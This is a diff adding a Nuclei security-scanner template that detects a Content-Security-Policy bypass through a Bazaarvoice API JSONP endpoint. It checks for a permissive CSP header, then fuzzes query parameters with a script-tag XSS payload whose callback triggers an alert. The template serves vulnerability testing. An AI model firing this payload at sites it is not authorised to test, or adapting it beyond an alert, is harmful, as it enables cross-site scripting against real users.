@@ -1,0 +1,55 @@
+id: bazaarvoice-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Bazaarvoice API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,bazaarvoice-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "bazaarvoice.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: bazaarvoice_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://api.bazaarvoice.com/data/batch.json?passkey=e75powr7wqhg1ah5seu00zawf&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "bazaarvoice_api_csp_xss == true"
+# digest: 490a0046304402202fa8ceab91750ad159517c978969e478a6e634023955643d7f1acb0174d8f63e0220136dd521efba013e7e5227d929d17dfc4f21220dd6ccdf8639a120bbcabff6d5:922c64590222798bb761d5b6d8e72950
